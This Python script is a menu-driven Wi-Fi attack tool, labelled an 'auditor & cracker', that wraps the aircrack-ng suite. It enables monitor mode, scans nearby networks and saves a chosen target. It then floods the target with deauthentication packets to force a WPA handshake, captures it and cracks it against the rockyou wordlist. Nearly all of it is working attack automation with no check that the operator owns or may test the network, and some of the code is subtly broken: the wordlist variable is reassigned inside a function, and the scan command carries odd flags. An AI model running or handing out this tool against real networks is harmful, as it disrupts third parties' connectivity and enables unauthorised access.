import subprocess
import os
import time
import csv

# ==========================================
# 1. CONFIGURATION & DIRECTORIES
# ==========================================
AUDIT_DIR = os.path.expanduser("~/wifi_audits")
LOGS_DIR = os.path.join(AUDIT_DIR, "logs")
CAP_DIR = os.path.join(AUDIT_DIR, "captures")
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt" # Default Kali wordlist, edit if needed

# Ensure directories exist
for d in [AUDIT_DIR, LOGS_DIR, CAP_DIR]:
    if not os.path.exists(d):
        os.makedirs(d)

# ==========================================
# 2. MAIN MENU (THE ENGINE)
# ==========================================
def main():
    """Central hub connecting user to functions."""
    while True:
        os.system('clear')
        print("="*60)
        print("           WIFI AUDITOR & CRACKER v2.0           ")
        print("="*60)
        
        check_status()
        
        print("\n1. [PREP] Enable Monitor Mode")
        print("2. [SCAN] Discover Networks & Log Data")
        print("3. [SELECT] View Networks & Choose Target")
        print("4. [ATTACK] Handshake Capture & Crack")
        print("5. [DATA] View Stored Files")
        print("6. [EXIT] Stop & Restore System")
        
        choice = input("\nSelect an option (1-6): ")
        
        if choice == '1':
            start_audit()
        elif choice == '2':
            scan_networks()
        elif choice == '3':
            select_target()
        elif choice == '4':
            perform_attack()
        elif choice == '5':
            view_storage()
        elif choice == '6':
            stop_audit()
            print("Exiting tool. Stay safe!")
            break

# ==========================================
# 3. STATUS & PREPARATION
# ==========================================

def check_status():
    """Reads terminal output to see if Monitor Mode is on."""
    print("\n" + "-"*45)
    try:
        # Check current interface mode using iwconfig
        status = subprocess.check_output("iwconfig", shell=True, stderr=subprocess.STDOUT).decode()
        if "Mode:Monitor" in status:
            print(">> STATUS: [ MONITOR MODE ACTIVE ]")
            print(">> NEXT: Use Option 2 to Scan.")
        else:
            print(">> STATUS: [ MANAGED MODE ]")
            print(">> NEXT: Use Option 1 to Prep.")
    except:
        print(">> STATUS: [ ERROR: NO WIFI CARD DETECTED ]")
    print("-"*45)

def start_audit():
    """Enables monitor mode using airmon-ng."""
    interface = input("\nEnter your interface (usually wlan0): ")
    print("[*] Killing conflicting processes...")
    subprocess.run("sudo airmon-ng check kill", shell=True)
    print(f"[*] Starting monitor mode on {interface}...")
    subprocess.run(f"sudo airmon-ng start {interface}", shell=True)
    time.sleep(3)
    print("[!] Done. Monitor Mode Enabled.")
    input("Press Enter...")

def stop_audit():
    """Restores the system back to normal internet mode."""
    # Attempt to find the monitor interface automatically or ask user
    try:
        # Simple check for interface name ending in 'mon'
        result = subprocess.check_output("iwconfig", shell=True).decode()
        if "Mode:Monitor" in result:
            # Extract the interface name from the output line
            for line in result.split('\n'):
                if "Mode:Monitor" in line:
                    interface = line.split()[0]
                    print(f"[*] Stopping monitor mode on {interface}...")
                    subprocess.run(f"sudo airmon-ng stop {interface}", shell=True)
                    break
        else:
            print("[!] No active monitor interface found to stop.")
    except Exception as e:
        print(f"[!] Error stopping monitor mode: {e}")
    
    print("[*] Restarting NetworkManager...")
    subprocess.run("sudo systemctl restart NetworkManager", shell=True)
    print("[!] Internet Restored.")
    time.sleep(2)

# ==========================================
# 4. SCANNING & LOGGING
# ==========================================

def scan_networks():
    """
    Scans for networks using airodump-ng, saves to CSV, and parses it.
    Stops after a set time to prevent hanging.
    """
    os.system('clear')
    print("--- NETWORK DISCOVERY ---")
    
    # Find the active monitor interface
    monitor_interface = None
    try:
        result = subprocess.check_output("iwconfig", shell=True).decode()
        for line in result.split('\n'):
            if "Mode:Monitor" in line:
                monitor_interface = line.split()[0]
                break
    except:
        pass

    if not monitor_interface:
        monitor_interface = input("Enter monitor interface (e.g., wlan0mon): ")

    # Define output file paths
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    output_csv = os.path.join(LOGS_DIR, f"scan_{timestamp}.csv")
    output_cap = os.path.join(CAP_DIR, f"scan_{timestamp}")
    
    print(f"[*] Starting scan on {monitor_interface}...")
    print(f"[*] Logging to: {output_csv}")
    
    # Command to run airodump-ng for 30 seconds and output CSV
    # We use subprocess.Popen to run it in the background
    cmd = f"sudo airodump-ng {monitor_interface} --output-format csv -w {output_cap} --essid --channel -1"
    
    # Run for 30 seconds then kill
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    try:
        print("[*] Scanning for 30 seconds... (Press Ctrl+C to stop early)")
        time.sleep(30)
    except KeyboardInterrupt:
        print("\n[*] Scan interrupted by user.")
    
    proc.terminate()
    
    # Wait a moment for file writing to complete
    time.sleep(2)
    
    # Parse the CSV to verify data
    parse_scan_results(output_cap + "-01.csv")
    
    input("\nPress Enter to return...")

def parse_scan_results(csv_file):
    """Reads the airodump CSV and prints found networks."""
    if not os.path.exists(csv_file):
        print(f"[!] File not found: {csv_file}")
        return

    print(f"\n--- RESULTS FROM {os.path.basename(csv_file)} ---")
    print(f"{'BSSID':<20} {'CH':<4} {'PWR':<5} {'ESSID':<30}")
    print("-" * 65)

    try:
        with open(csv_file, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                # Filter out empty rows or non-AP rows (stations)
                if row.get('BSSID') and row.get('ESSID') and row.get('BSSID') != 'Station MAC':
                    bssid = row['BSSID']
                    ch = row.get('CH', '?')
                    pwr = row.get('PWR', '?')
                    essid = row.get('ESSID', 'Hidden')
                    print(f"{bssid:<20} {ch:<4} {pwr:<5} {essid:<30}")
    except Exception as e:
        print(f"[!] Error parsing CSV: {e}")

# ==========================================
# 5. TARGET SELECTION & STORAGE
# ==========================================

def select_target():
    """
    Lists available scan logs, lets user choose one,
    parses the CSV, and saves the target details to a 'target.txt' file.
    """
    os.system('clear')
    print("--- SELECT TARGET NETWORK ---")
    
    # List available scan logs
    logs = [f for f in os.listdir(LOGS_DIR) if f.startswith("scan_") and f.endswith(".csv")]
    if not logs:
        print("[!] No scan logs found. Run Option 2 first.")
        input("Press Enter...")
        return

    print("\nAvailable Scan Logs:")
    for i, log in enumerate(logs, 1):
        print(f"{i}. {log}")
    
    try:
        choice = int(input("\nSelect a log file (number): ")) - 1
        if 0 <= choice < len(logs):
            selected_log = os.path.join(LOGS_DIR, logs[choice])
            
            # Parse and display networks from this log
            networks = []
            try:
                with open(selected_log, 'r') as f:
                    reader = csv.DictReader(f)
                    for row in reader:
                        if row.get('BSSID') and row.get('ESSID') and row.get('BSSID') != 'Station MAC':
                            networks.append(row)
            except Exception as e:
                print(f"[!] Error reading log: {e}")
                return

            if not networks:
                print("[!] No networks found in this log.")
                return

            print("\n--- NETWORKS FOUND ---")
            print(f"{'Index':<6} {'BSSID':<20} {'CH':<4} {'ESSID':<30}")
            print("-" * 70)
            for i, net in enumerate(networks):
                print(f"{i+1:<6} {net['BSSID']:<20} {net.get('CH', '?'):<4} {net.get('ESSID', 'Hidden'):<30}")

            target_idx = int(input("\nEnter index of target network: ")) - 1
            if 0 <= target_idx < len(networks):
                target = networks[target_idx]
                
                # Save target details to a file for the attack phase
                target_file = os.path.join(AUDIT_DIR, "target.txt")
                with open(target_file, 'w') as f:
                    f.write(f"BSSID={target['BSSID']}\n")
                    f.write(f"ESSID={target.get('ESSID', 'Hidden')}\n")
                    f.write(f"CH={target.get('CH', '1')}\n")
                
                print(f"\n[+] Target Selected: {target.get('ESSID', 'Hidden')} ({target['BSSID']})")
                print(f"[+] Details saved to {target_file}")
            else:
                print("[!] Invalid index.")
        else:
            print("[!] Invalid selection.")
    except ValueError:
        print("[!] Please enter a valid number.")
    
    input("\nPress Enter...")

# ==========================================
# 6. ATTACK PHASE (HANDSHAKE & CRACK)
# ==========================================

def perform_attack():
    """
    Main attack function:
    1. Reads target details.
    2. Captures handshake using airodump-ng and aireplay-ng.
    3. Cracks using aircrack-ng.
    """
    os.system('clear')
    print("--- ATTACK PHASE ---")
    
    # Load target details
    target_file = os.path.join(AUDIT_DIR, "target.txt")
    if not os.path.exists(target_file):
        print("[!] No target selected. Use Option 3 first.")
        input("Press Enter...")
        return

    target = {}
    with open(target_file, 'r') as f:
        for line in f:
            if '=' in line:
                key, value = line.strip().split('=', 1)
                target[key] = value

    bssid = target.get('BSSID')
    essid = target.get('ESSID', 'Unknown')
    channel = target.get('CH', '1')
    
    if not bssid:
        print("[!] Error: Target BSSID missing.")
        return

    print(f"Target: {essid} ({bssid}) on Channel {channel}")

    # Find monitor interface
    monitor_interface = None
    try:
        result = subprocess.check_output("iwconfig", shell=True).decode()
        for line in result.split('\n'):
            if "Mode:Monitor" in line:
                monitor_interface = line.split()[0]
                break
    except:
        pass

    if not monitor_interface:
        monitor_interface = input("Enter monitor interface (e.g., wlan0mon): ")

    # 1. Capture Handshake
    print("\n[1] Starting Handshake Capture...")
    cap_file = os.path.join(CAP_DIR, f"target_{bssid.replace(':', '')}")
    
    # Start airodump-ng in background to capture to file
    # We use Popen so we can kill it later
    airodump_cmd = f"sudo airodump-ng {monitor_interface} --bssid {bssid} -c {channel} -w {cap_file}"
    dump_proc = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Wait for airodump to initialize
    time.sleep(5)
    
    # Send Deauth packets to force handshake
    print("[*] Sending deauthentication packets to capture handshake...")
    # Sending 5 packets, repeat a few times
    for _ in range(3):
        subprocess.run(f"sudo aireplay-ng --deauth 5 -a {bssid} {monitor_interface}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)

    # Wait for handshake capture
    print("[*] Waiting 20 seconds for handshake...")
    time.sleep(20)
    
    # Stop airodump
    dump_proc.terminate()
    dump_proc.wait()
    
    # Check if capture file exists
    # Airodump appends -01, -02, etc.
    capture_path = f"{cap_file}-01.cap"
    if not os.path.exists(capture_path):
        print("[!] Failed to capture handshake. File not created.")
        input("Press Enter...")
        return
        
    print(f"[+] Handshake captured: {capture_path}")

    # 2. Crack Handshake
    print("\n[2] Starting Cracking Process...")
    if not os.path.exists(WORDLIST_PATH):
        print(f"[!] Wordlist not found at {WORDLIST_PATH}")
        custom_wordlist = input("Enter path to wordlist (or press Enter to skip cracking): ")
        if custom_wordlist and os.path.exists(custom_wordlist):
            WORDLIST_PATH = custom_wordlist
        else:
            print("[!] Skipping crack phase.")
            return

    print(f"[*] Using wordlist: {WORDLIST_PATH}")
    print("[*] Running aircrack-ng...")
    
    # Run aircrack-ng
    crack_cmd = f"sudo aircrack-ng -w {WORDLIST_PATH} {capture_path}"
    subprocess.run(crack_cmd, shell=True)

    input("\nAttack complete. Press Enter...")

# ==========================================
# 7. UTILITIES
# ==========================================

def view_storage():
    """Lists files inside the AUDIT_DIR."""
    os.system('clear')
    print(f"--- STORAGE: {AUDIT_DIR} ---")
    
    print("\n[Logs & Scans]")
    if os.path.exists(LOGS_DIR):
        for f in os.listdir(LOGS_DIR):
            print(f"  - {f}")
    
    print("\n[Captures]")
    if os.path.exists(CAP_DIR):
        for f in os.listdir(CAP_DIR):
            print(f"  - {f}")
            
    print("\n[Config]")
    if os.path.exists(os.path.join(AUDIT_DIR, "target.txt")):
        print("  - target.txt (Current Target)")
    
    input("\nPress Enter to return...")

# ==========================================
# START
# ==========================================
if __name__ == "__main__":
    main()